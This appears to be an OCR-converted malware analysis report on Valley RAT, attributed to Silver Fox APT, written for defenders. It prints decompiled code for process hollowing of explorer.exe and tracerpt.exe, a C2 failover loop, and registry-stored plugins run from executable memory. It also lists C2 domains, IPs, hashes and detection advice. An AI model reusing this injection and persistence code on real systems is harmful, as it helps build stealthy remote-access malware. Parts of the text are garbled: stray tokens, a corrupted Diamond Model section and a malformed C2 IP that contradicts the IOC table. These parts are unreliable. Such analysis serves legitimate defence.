\n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "ResumeThread(lpProcessInformation->hThread);", "hash": "hash"}
